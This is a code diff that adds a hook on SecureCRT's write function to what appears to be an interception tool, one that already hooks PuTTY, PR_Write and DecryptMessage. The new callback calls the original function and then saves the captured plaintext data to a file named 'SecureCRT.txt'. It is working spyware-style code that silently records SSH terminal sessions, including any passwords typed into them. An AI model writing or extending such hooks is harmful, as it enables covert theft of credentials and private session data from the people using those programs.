@@ -32,6 +32,8 @@ DecryptMessage_Typedef DecryptMessage_Original;
 PuttySend_Typedef PuttySend_Original;
 PuttyRecv_Typedef PuttyRecv_Original;
 
+SecureCRT_Typedef SecureCRT_Original;
+
 // PR_Write callback
 
 int PR_Write_Callback(void *fd, void *buffer, DWORD amount)
@@ -464,4 +466,35 @@ Packet* SSH_Rdpkt_Callback(void *ssh, unsigned char **data, int *datalen)
 	Hooker::RestoreHook((void *)SSH_Rdpkt_Callback);
 
 	return pkt;
+}
+
+// SecureCRT_Write callback
+
+int __stdcall SecureCRT_Callback(unsigned char **data, DWORD size)
+{
+	DWORD ecx_bkp = 0;
+	__asm { mov ecx_bkp, ecx };
+
+	// Stuff required to avoid overwriting ECX
+	
+	unsigned char **temp_data = data;
+	DWORD temp_size = size;
+	
+	BOOL bFlag = FunctionFlow::CheckFlag();
+
+	__asm { mov ecx, ecx_bkp };
+
+	int ret = SecureCRT_Original(temp_data, temp_size);
+
+	// Do things
+
+	if (bFlag == FALSE)
+	{
+		if (*data != NULL) PluginSystem::ProcessAndSaveRead("SecureCRT.txt", (*data), size);
+	}
+
+	FunctionFlow::UnCheckFlag();
+	Hooker::RestoreHook((void *)SecureCRT_Callback);
+
+	return ret;
 }
